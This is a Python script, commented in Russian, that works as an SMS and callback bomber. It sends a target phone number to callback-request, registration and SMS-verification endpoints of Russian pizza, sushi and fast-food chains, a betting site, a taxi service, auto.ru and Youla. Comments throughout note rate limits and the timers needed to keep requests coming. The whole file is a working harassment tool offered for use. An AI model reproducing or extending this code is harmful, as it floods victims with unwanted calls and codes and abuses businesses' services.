import requests
phone = '89992223456'


def pizzalarenzo(phone):
    headers = {
        'name':'%D0%92%D0%B0%D1%81%D0%B8%D0%BB%D0%B8%D0%B9',
        'phone': phone,
        'time':'%D0%91%D0%BB%D0%B8%D0%B6%D0%B0%D0%B9%D1%88%D0%B5%D0%B5+%D0%B2%D1%80%D0%B5%D0%BC%D1%8F'
    }
    response_pizzalarenzo = requests.post(url='https://pizzalarenzo.ru/api/callback.php', headers=headers)
    print(response_pizzalarenzo)

def tarelochka(phone):
    headers = {
        'url':'tarelochcka-2016%40yandex.ru',
        'name_1':'%D0%92%D0%B0%D1%81%D0%B8%D0%BB%D0%B8%D0%B9',
        'phone_1': phone

    }
    response_tarelochka = requests.post(url='https://xn--80achdsmuvm0h.xn--p1ai/send/send_1.php', headers=headers)
    print(response_tarelochka)

def pizzapan(phone):
    headers = {
        'name':'%D0%92%D0%B0%D1%81%D0%B8%D0%BB%D0%B8%D0%B9',
        'mytel': phone

    }
    response_pizzapan = requests.post(url='http://pizzapan.ru/send2.php', headers=headers)
    print(response_pizzapan)

# уебищное форматирование номера, fix me
def dostaevsky():
    headers = {
        'phone':'+7 999 233-23-43'
    }
    response_dostaevsky = requests.post(url='https://msk.dostaevsky.ru/ajax/feedback/back_call.php', headers=headers)
    print(response_dostaevsky)

def pizzasushiwok(phone):
    headers = {
        'mod_name':'call_me',
        'task':'request_call',
        'name':'%D0%92%D0%B0%D1%81%D0%B8%D0%BB%D0%B8%D0%B9',
        'phone': phone
    }
    response_pizzasushiwok = requests.post(url='https://pizzasushiwok.ru/', headers=headers)
    print(response_pizzasushiwok)

# уебищное форматирование номера, fix me
def ipizza():
    headers = {
        'name':'%D0%92%D0%B0%D1%81%D0%B8%D0%BB%D0%B8%D0%B9',
        'phone': '%2B7+(999)+234-56-78'
    }
    # говно с ногтями
    response_ipizza = requests.post(url='https://ipizza.ru/xml/api/callback/', headers=headers)
    print(response_ipizza)

# тут мне было впадлу сделать параметр, ес чо надо только номер подставить
def okeansushi(phone):
    response_okeansushi = requests.post(url='https://okeansushi.ru/includes/contact.php?call_mail=1&ajax=1&name=%D0%93%D0%BE%D1%80%D0%B8%D0%B3%D0%BE%D1%80%D0%B8%D0%B5%D0%B9&phone=8+(999)+234-44-44&call_time=1&call_time_dt%5B%5D=21&call_time_dt%5B%5D=45&pravila2=on')
    print(response_okeansushi)

# тоже немного пидорский формат номера, fix me
def sunlight():
    response_sunlight = requests.post(url='https://api.sunlight.net/v3/customers/authorization/', json={"phone": "7999*******"})
    print(response_sunlight)

# уебищное форматирование номера, fix me
# тут если слать чаще чем раз примерно в минуту - ту мэни реквестс, надо таймер на минуту ставить
def bk():
    response_bk = requests.post(url='https://deliverysmart.burgerking.ru/account/session', json={"phone":"+7 (999) ***-**-**","g-recaptcha-response":"null"})
    print(response_bk)

# ваще хз, надо тестить, но должно работать, сначала регает, потом ресторит пароль раз в 3 минуты
def olimpbet():
    response_olimpbet = requests.post(url='https://www.olimp.bet/api/smsregistration', json={"lang_id":"0","platforma":"SITE_CUPIS","cash":"3","telnum":"7999*******","email":"***@gmail.com","tag":"c4bee55d6bb50e85287bffe8fd0113d5"})
    print(response_olimpbet)

    # вот ниже реквест с таймаутом в 3 минуты
    response_olimpbet = requests.post(url='https://www.olimp.bet/api/user/passrestore/', json={"lang_id":"0","platforma":"SITE_CUPIS","kind":"phone","data":"7999*******"})
    print(response_olimpbet)

#тут какой-то таймаут, надо тестить, мне лень сейчас сидеть и засекать, вроде минута, но оно как-то хз работает
def kfc():
    response_kfc = requests.post(url='https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={"phone":"+7930*******"})
    print(response_kfc.content)

#ваще без таймаута походу
def taxinonstop(phone):
    response_taxinonstop = requests.post(url='https://taxinonstop.ru/dist/backend/register.php', json={"cmd":"register","phone":phone,"taxi_city":"tmn"})
    print(response_taxinonstop)

def autoru():
    response_autoru = requests.post(url='https://auth.auto.ru/ajax/', json={"items":{"path":"auth/login-or-register","params":{"phone":"89301237945","retpath":"https://auto.ru/"}}})
    print(response_autoru.content)

def youla():
    headers = {
        'phone':'79301237946'
    }
    response_youla = requests.post(url='https://youla.ru/web-api/auth/request_code', headers=headers)
    print(response_youla)

# pizzalarenzo(phone)
# tarelochka(phone)
# pizzapan(phone)
# dostaevsky()
# pizzasushiwok(phone)
# ipizza()
# sunlight()
# bk()
# olimpbet
# kfc()
# taxinonstop(phone)
youla()